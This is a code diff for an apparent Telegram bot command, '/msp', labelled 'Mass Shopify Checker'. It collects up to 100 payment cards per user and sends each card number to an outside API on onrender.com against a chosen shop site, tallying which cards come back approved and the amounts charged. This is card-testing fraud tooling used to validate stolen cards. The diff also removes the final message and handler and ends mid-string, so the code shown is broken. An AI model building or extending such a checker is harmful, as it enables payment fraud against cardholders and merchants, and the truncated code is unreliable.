@@ -3437,17 +3437,19 @@ import json
 from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
-from telegram.ext import CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
+from telegram.ext import (
+    ContextTypes, ConversationHandler, CommandHandler,
+    MessageHandler, filters
+)
 from db import get_user
 
-WAITING_CARDS = 1
+ASK_CARDS = 1  # Conversation state
 
 async def msp_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start /msp conversation and ask user for cards"""
+    """Start /msp command and ask user for cards"""
     user_id = update.effective_user.id
     user_data = await get_user(user_id)
     site = user_data.get("custom_url")
-
     if not site:
         await update.message.reply_text("❌ You have not added any sites. Use /seturl first.")
         return ConversationHandler.END
@@ -3456,17 +3458,19 @@ async def msp_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⏳ 𝓟𝓵𝓮𝓪𝓼𝓮 send your cards (max 100) as text or .txt file.",
         parse_mode=ParseMode.HTML
     )
-    # Save site in context for next step
-    context.user_data["site"] = site
-    return WAITING_CARDS
+    return ASK_CARDS
+
 
 async def msp_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receive cards and process them"""
-    site = context.user_data.get("site")
+    """Receive cards from user and process them"""
+    user_id = update.effective_user.id
+    user_data = await get_user(user_id)
+    site = user_data.get("custom_url")
     if not site:
-        await update.message.reply_text("❌ Site URL missing.")
+        await update.message.reply_text("❌ No site found. Use /seturl first.")
         return ConversationHandler.END
 
+    # Extract cards
     cards = []
     if update.message.text:
         cards = [c.strip() for c in update.message.text.splitlines() if c.strip()]
@@ -3502,12 +3506,13 @@ async def msp_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
             api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={card}"
             try:
                 async with session.get(api_url, timeout=50) as resp:
-                    data = await resp.json()
+                    raw_text = await resp.text()
+                    data = json.loads(raw_text)
 
                 response_text = data.get("Response", "").upper()
                 price = float(data.get("Price", 0.0))
 
-                if "3D_AUTHENTICATION" in response_text or "APPROVED" in response_text:
+                if "3D_AUTHENTICATION" in response_text:
                     status_emoji = "✅"
                     stats["working"] += 1
                     stats["amt"] += price
@@ -3521,7 +3526,7 @@ async def msp_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 stats["checked"] += 1
                 card_results.append(f"{status_emoji} <code>{escape(card)}</code>\n   ↳ {escape(response_text)}")
 
-                # Update live message (last 10 cards only)
+                # Update live message with last 10 results
                 formatted_results = "\n".join(card_results[-10:])
                 await status_msg.edit_text(
                     f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
@@ -3530,47 +3535,7 @@ async def msp_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     f"✅ Approved: {stats['working']}\n"
                     f"❌ Declined: {stats['dead']}\n"
                     f"⚠️ Error: {stats['error']}\n"
-                    f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
-                    f"💲 Amount: ${stats['amt']:.2f}\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    "📝 Card Results\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"{formatted_results}",
-                    parse_mode=ParseMode.HTML
-                )
-
-                await asyncio.sleep(0.5)
-
-            except Exception:
-                stats["error"] += 1
-                stats["checked"] += 1
-                card_results.append(f"⚠️ <code>{escape(card)}</code>\n   ↳ API Error")
-
-    # Final message
-    await status_msg.edit_text(
-        f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌍 Total cards: {stats['total']}\n"
-        f"✅ Approved: {stats['working']}\n"
-        f"❌ Declined: {stats['dead']}\n"
-        f"⚠️ Error: {stats['error']}\n"
-        f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
-        f"💲 Amount: ${stats['amt']:.2f}\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📝 Card Results\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        + "\n".join(card_results),
-        parse_mode=ParseMode.HTML
-    )
-
-    return ConversationHandler.END
-
-# ConversationHandler to use
-msp_handler = ConversationHandler(
-    entry_points=[CommandHandler("msp", msp_start)],
-    states={WAITING_CARDS: [MessageHandler(filters.TEXT | filters.Document.ALL, msp_receive_cards)]},
-    fallbacks=[],
-)
+                    f"🔄 Checked: {stats['checked']} / {stats['total']}\n
 
 
 
